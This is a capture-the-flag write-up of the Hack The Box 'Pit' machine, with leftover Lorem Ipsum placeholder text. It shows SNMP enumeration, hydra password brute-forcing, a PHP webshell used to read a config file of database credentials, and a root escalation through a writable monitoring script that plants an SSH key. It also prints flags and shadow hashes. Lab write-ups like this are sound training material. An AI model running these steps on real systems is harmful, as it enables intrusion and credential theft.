---
layout: single
title: Pit - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-pit/pit_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-pit/pit_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/pit]# nmap -Pn -n -sCV --open 10.10.10.241
  PORT     STATE SERVICE         VERSION
  22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
  | ssh-hostkey:
  |   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
  |   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
  |_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
  80/tcp   open  http            nginx 1.14.1
  |_http-server-header: nginx/1.14.1
  |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
  9090/tcp open  ssl/zeus-admin?
  | fingerprint-strings:
  |   GetRequest, HTTPOptions:
  |     HTTP/1.1 400 Bad request
  |     Content-Type: text/html; charset=utf8
  |     Transfer-Encoding: chunked
  |     X-DNS-Prefetch-Control: off
  |     Referrer-Policy: no-referrer
  |     X-Content-Type-Options: nosniff
  |     Cross-Origin-Resource-Policy: same-origin
  |     <!DOCTYPE html>
  |     <html>
  |     <head>
  |     <title>
  |     request
  |     </title>
  |     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  |     <meta name="viewport" content="width=device-width, initial-scale=1.0">
  |     <style>
  |     body {
  |     margin: 0;
  |     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
  |     font-size: 12px;
  |     line-height: 1.66666667;
  |     color: #333333;
  |     background-color: #f5f5f5;
  |     border: 0;
  |     vertical-align: middle;
  |     font-weight: 300;
  |_    margin: 0 0 10p
  | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
  | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
  | Not valid before: 2020-04-16T23:29:12
  |_Not valid after:  2030-06-04T16:09:12

  PORT    STATE         SERVICE
  161/udp open|filtered snmp

Hostname: dms-pit.htb

DIRB:
  + http://10.10.10.241/index.html (CODE:200|SIZE:4057)
  + https://10.10.10.241:9090/favicon.ico (CODE:200|SIZE:819)
  + https://10.10.10.241:9090/ping (CODE:200|SIZE:24)

NIKTO:
  -


2. http://10.10.10.241 shows the default index.html for nginx.
https://10.10.10.241:9090 is a CentOS login page, we find the hostname 'pit.htb', and in the certificate 'dms-pit.htb'.
Capturing the login we see a GET request, where the credentials are base64 encoded.

BURP REQUEST:
GET /cockpit/login HTTP/1.1
Host: 10.10.10.241:9090
Cookie: cockpit=deleted
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
X-Authorize: password
X-Superuser: any
Te: trailers
Connection: close

In the request we see '/cockpit' - what is that?
  > Cockpit is a web-based administration tool for your linux servers.
  > With it you can manage and update your system, view logs, add users and ever run a terminal.
  > All within a browser!

Digging deeper into 'Cockpit' and we find that there are a unauth SSRF and RCE exploits. Trying out the exploits give nothing,
maybe I'm missing something here.

Instead I went back to enumerating and found that SNMP is open. Running 'snmp-check' gave some information, but nothing really
useful. Turning to 'snmpwalk.py' and playing around with the OID's gave us user michelle, and an absolute path to a web service.

  [root:/git/htb/pit]# ./snmpwalk.py -v 1 -c public 10.10.10.241 1.3.6.1.4.1
    ..
    SNMPv2-SMI::enterprises.2021.9.1.2.2 = OctetString: /var/www/html/seeddms51x/seeddms
    SNMPv2-SMI::enterprises.2021.9.1.3.1 = OctetString: /dev/mapper/cl-root
    SNMPv2-SMI::enterprises.2021.9.1.3.2 = OctetString: /dev/mapper/cl-seeddms
    ..
    SNMPv2-SMI::enterprises.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = OctetString: /usr/bin/monitor
    ..
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.13 = OctetString: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.14 = OctetString:
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.15 = OctetString: guest_u         user       s0         s0                             guest_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.16 = OctetString: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.17 = OctetString: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.18 = OctetString: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.19 = OctetString: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.20 = OctetString: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.21 = OctetString: user_u          user       s0         s0                             user_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.22 = OctetString: xguest_u        user       s0         s0                             xguest_r
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.23 = OctetString: login
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.24 = OctetString:
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.25 = OctetString: Login Name           SELinux User         MLS/MCS Range        Service
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.26 = OctetString:
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = OctetString: __default__          unconfined_u         s0-s0:c0.c1023       *
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.28 = OctetString: michelle             user_u               s0                   *
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.29 = OctetString: root                 unconfined_u         s0-s0:c0.c1023       *

OID's explained;
  1: iso
  3: identified-organization
  6: dod
  1: internet
  4: private
  1: enterprise


3. Access the webservice - 'http://dms-pit.htb/seeddms51x/seeddms'. We are prompted with a login, try to login with michelle and
capture the request to see what's going on.

It's a simple http post form where the auth data is sent in clear text. Reading about SeedDMS the standard default user is 'admin'.
To speed things up we use hydra to brute force the password of our two potential users - michelle and admin, starting with michelle.

ORIGINAL REQUEST:
POST /seeddms51x/seeddms/op/op.Login.php HTTP/1.1
Host: dms-pit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://dms-pit.htb
Connection: close
Referer: http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F
Upgrade-Insecure-Requests: 1

referuri=/seeddms51x/seeddms/&login=michelle&pwd=password&lang=en_GB


  [root:/git/htb/pit]# hydra -l michelle -P /usr/share/wordlists/rockyou.txt -vV -f dms-pit.htb http-post-form "/seeddms51x/seeddms/op/op.Login.php:login=^USER^&pwd=^PASS^:Error signing in"
    ..
    [80][http-post-form] host: dms-pit.htb   login: michelle   password: michelle

A working set of credentials! Login as michelle:michelle and enumerate the site.
Going to 'My Account' > Users we find all available users;
  Administrator (admin@pit.htb)
  Jack (jack@dms-pit.htb)
  Michelle (michelle@pit.htb)

We find another note from the Administrator:
  > "Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15."
  > "See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb."


Looking for vulnerabilities in SeedDMS we find a RCE vuln via the upload function.
a) Upload a webshell and take note of it's document ID
b) Exploit using curl/browser, where 1048576 is constant directory, 46 is document id, and 1.php is the renamed file.

  [root:/git/htb/pit]# curl http://dms-pit.htb/seeddms51x/data/1048576/46/1.php\?cmd\=id                                        (master✱)
    <!-- Usage: http://target.com/mini.php?cmd=cat+/etc/passwd -->
    <pre>uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
    </pre>#

Enumerate the service and while looking in SeedDMS settings-file we finda database user + password.
  [root:/git/htb/pit]# curl http://dms-pit.htb/seeddms51x/data/1048576/46/1.php\?cmd\='cat /var/www/html/seeddms51x/conf/settings.xml'
    ..
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">


4. Try the password against services we know - SeedDMS jack:ied^ieY6xoquu, admin:ied^ieY6xoquu - no match.
Try on the pit.htb:9090, admin:ied^ieY6xoquu, root:ied^ieY6xoquu, michelle:ied^ieY6xoquu - MATCH!

pit.htb:9090, michelle:ied^ieY6xoquu works!

In the bottom left of the navbar we find "Terminal", press it and grab user.txt.

  [michelle@pit ~]$ cat user.txt
    6ccbdd3941e1d701503b52b4cd30073f

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. For persistence and ease of use create a SSH-key and add it to /home/michelle/.ssh/authorized_keys

  [root:/git/htb/pit]# ssh-keygen -t rsa -b 4096 -f michelle-id_rsa                                                             (master✱)
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in michelle-id_rsa
    Your public key has been saved in michelle-id_rsa.pub
    The key fingerprint is:
    SHA256:LY62mMgVYacdhVKZ9Y09zenY7ptew7WYu70viJ8tXcI root@nidus
    The key's randomart image is:
    +---[RSA 4096]----+
    |     ..=o        |
    |    . +. . + o . |
    |    o.o   o + +  |
    |   . = . .   =   |
    |    o . S . ..o .|
    |     . o .   .E +|
    |    . o .  . =.*.|
    | . o + .  . o+=o.|
    |  o o .    .o=B=+|
    +----[SHA256]-----+

  [michelle@pit ~]$ mkdir .ssh
  [michelle@pit ~]$ cd .ssh/
  [michelle@pit .ssh]$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCbGm8z5rFxUftH1sJkVxfAmFd+vPq8p7FsfQjOuBhtOtGsLvxIiJ3seKPUDQ/uS1oc4PCFuGpjhix9HxN55JRWohmn+JblAlDU7zC6MFh1TG14YlM1joJhgp+CNGq00wEcAaOoMHEjIA0u04fzQikPHxdZSYsT9Al01LvSXVW5IutZlJ0OovFWH2GsjzyM/6BGFat1loApTTYH7VbNIEmHEKh14a8gpmS9Izkd8cCkqUu5l6UA3AG1Sh4VGgAuwgAP1MUcMKIK0HWf1qWcrP0ZE1y6I9/gDGCHi0mmyrnVSCPdPm2oIchmV/WCkVP2PYrk+U9wrWtWN02RgSBntAQQAIW8pdekad3TldoHJtUcbW7EZ4QUyJHtDXWTw9drmVU43j4zlQeNbzKVlExl+XBneEHptntT7nScvD9ED33ONC2Y4lIoSmUnlkqPWCv/euvuvv0YrhDTGmg8G95dp89DX59mszrJy5XLWjFJ6lCgxUAAlNC5c7mhBORWkryib30Bi117BSBazhPa8zzeKhYQwqeJ3nwfM1D3pL+5pOLa7b++IwzriaTWDV2Yq+QdOd9vSNGZuXOX/gZ7pW9TrUYKJb68xDIXl1GfLRt4k5XLoNHW7h3PFCi5xr49Avcnje38wDpWE0l4uN35QsZhigVUOuxCPrhylSBD+5J/8MwJ9Q==" > authorized_keys
  [michelle@pit .ssh]$ chmod 700 ~/.ssh
  [michelle@pit .ssh]$ chmod 600 ~/.ssh/authorized_keys

  [root:/git/htb/pit]# chmod 400 michelle-id_rsa
  [root:/git/htb/pit]# ssh michelle@pit.htb -i michelle-id_rsa                                                                  (master✱)
    Web console: https://pit.htb:9090/

    Last login: Tue May 18 06:58:20 2021
    [michelle@pit ~]$


2. Execute standard manual enum - 'sudo -l', 'ss -tulwn', 'ps -aux', sql database etc.

  [michelle@pit /]$ ss -tulwn
    Netid          State           Recv-Q          Send-Q                   Local Address:Port                    Peer Address:Port
    icmp6          UNCONN          0               0                                    *:58                                 *:*
    udp            UNCONN          0               0                              0.0.0.0:161                          0.0.0.0:*
    udp            UNCONN          0               0                            127.0.0.1:323                          0.0.0.0:*
    udp            UNCONN          0               0                                [::1]:323                             [::]:*
    tcp            LISTEN          0               64                           127.0.0.1:33767                        0.0.0.0:*
    tcp            LISTEN          0               128                          127.0.0.1:199                          0.0.0.0:*
    tcp            LISTEN          0               128                            0.0.0.0:80                           0.0.0.0:*
    tcp            LISTEN          0               128                            0.0.0.0:22                           0.0.0.0:*
    tcp            LISTEN          0               128                                  *:9090                               *:*
    tcp            LISTEN          0               80                                   *:3306                               *:*
    tcp            LISTEN          0               128                               [::]:80                              [::]:*
    tcp            LISTEN          0               128                               [::]:22                              [::]:*

With 'ps -aux' we are not able to see all services, we could see a lot more from snmp-check or snmpwalk.

  [michelle@pit shm]$ ./linpeas.sh
    ..
    [+] PATH
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
    /home/michelle/.local/bin:/home/michelle/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
    New path exported: /home/michelle/.local/bin:/home/michelle/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin

We have a suspicious PATH - we should probably hijack a service and put a reverse shell in /home/michelle/bin/ or something.
But to do that we need to find services that are ran by root. 'ps -aux' isn't helping us, and 'pspy64' gives nothing.

Looking back at the snmpwalk output we found '/usr/bin/monitor'.

  [michelle@pit bin]$ cat /usr/bin/monitor
    #!/bin/bash

    for script in /usr/local/monitoring/check*sh
    do
        /bin/bash $script
    done

Analysing the script, it seems like it's running any/all scripts named check*sh - meaning we can create a bash script to copy
/root/root.txt to /dev/shm, steal /root/.ssh/id_rsa, or put our public key to /root/.ssh/authorized_keys.
NOTE: Reverse shell is not working, probably because of firewall rules.


3. Create a new SSH key for root and do a simple shell script to exploit the server.

  [root:/git/htb/pit]# ssh-keygen -t rsa -b 4096 -f root-id_rsa                                                                     (master✱)
    Generating public/private rsa key pair.
    Enter passphrase (empty for no passphrase):
    Enter same passphrase again:
    Your identification has been saved in root-id_rsa
    Your public key has been saved in root-id_rsa.pub
    The key fingerprint is:
    SHA256:yYc3O25wt5maNafCX1OsVVtqJ5wzGTMsEkuVjWxWzCI root@nidus
    The key's randomart image is:
    +---[RSA 4096]----+
    |          oo.B.  |
    |         .EoB.+  |
    |          o+..= o|
    |       . o . o O+|
    |        S +   X.=|
    |        .o.o.. O |
    |         +o.o+=  |
    |         .+++= . |
    |         .++o    |
    +----[SHA256]-----+

  [root:/git/htb/pit]# chmod 400 root-id_rsa

  [michelle@pit shm]$ chmod +x check.sh
  [michelle@pit shm]$ cat check.sh
    #!/bin/bash
    mkdir /root/.ssh
    chmod 700 /root/.ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMd2s5HemYsiwVFi8sFkrwjmtd2M+k7R5h1ckjtbnjG1KDIdLUc11QzeTf/S9v5PgY/bx3999k5VhxOPc26ag5cHy4UWeWccZC9w1OJFGNl6pFfIZtMxYXwyZGEyNcbxFEDJpOofcPMhuS4QHgBeYc0JUwAPp3ArVx++VEmTBFhaUtvxorQlJ4EqQ266upc0BdOANoblTcKRiKw0AU1bxAsRPYCuiw5Npc2BK9uwmkRFynULzPI8ZTRmtUtGI7Wc4c+IvsBN8+D0hN1GbfCKlGJJVP/DJ0mUJZMEZbvJafwrbJGQnJuE50sYMpMkqn1Yjt4CouFchVt9+akFVEmL4rR1qFKdvyzYMxA2ZYME0Pq91FucEr4MUSjG1oy0HVzD6IVmrVZzPRHlbfkRTROh8gpL4E16uwtDEGI8CNcKzKcv2Pd36ksKuyVnA+cYyRIh8PyjW2+53NZYb/1ZMAvBrXISNOusZBD6oC1RTFceQiTmScLogzG9Ew3bQhwL3gwpR7Le8bskcuK6XNfGfTb3pkGQhv/vLtqL+iJdVxPmNc3QeagZvV86MRtAtsjNbS8uXhC0g7Yk/YlBglcnz2f5cW4UGQU0vMdMxiGT9EPXq/rOpdoaXmJzSLekBZ+WpQgg3P34pH9kkVJkou9tPeRaN6IE6KGgfm72vTr8gre7ibMQ==" > /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
  [michelle@pit shm]$ cp check.sh /usr/local/monitoring/


To trigger the script simply run snmpwalk again and login with SSH.

  [root:/git/htb/pit]# ./snmpwalk.py -v 1 -c public 10.10.10.241 1.3.6.1.4.1
    ..
    SNMPv2-SMI::enterprises.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = OctetString: /usr/bin/monitor
    ..
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.30 = OctetString: 0x6d6b6469723a2063616e6e6f7420637265617465206469726563746f727920e280982f726f6f742f2e737368e280993a2046696c6520657869737473
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.31 = OctetString: chmod: changing permissions of '/root/.ssh': Permission denied
    SNMPv2-SMI::enterprises.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.32 = OctetString: chmod: changing permissions of '/root/.ssh/authorized_keys': Permission denied

If we decode the hex-string we get 'mkdir: cannot create directory /root/.ssh: File exists'. And the following lines
tells us that the chmod also was unnecessary. The only line that did go through was the echo.

  [root:/git/htb/pit]# ssh root@pit.htb -i root-id_rsa                                                                              (master✱)
    Web console: https://pit.htb:9090/

    Last login: Mon May 10 11:42:46 2021
    [root@pit ~]# cat root.txt
      1e1d0c725f9a9615a33dc02abad8da46

    [root@pit ~]# cat /etc/shadow
      root:$6$4ZnZ0Iv3NzFIZtKa$tA78wgAwaBBSg96ecMRPYIogQmANo/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.:18757:0:99999:7:::
      michelle:$6$hBsV4t2c9NMnABDe$.4cAMWqwmYPobZdusViisVwuafxDBSptElF1pFyg8O0ypF8DKoiqzYU9EfBx8H/gnTUGPMxEoxoc35rZWZDYn.:18370:0:99999:7:::



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Cockpit:
  https://github.com/agentejo/cockpit/tree/0.11.1

Install Cockpit on CentOS8
  https://medium.com/@r.szulist/how-to-install-and-configure-cockpit-on-cenos8-3615d503092a

SNMP Enum:
  https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp

OID Repo:
  http://oid-info.com/get/1.3.6.1.4.1

SeedDMS RCE:
  https://www.exploit-db.com/exploits/47022
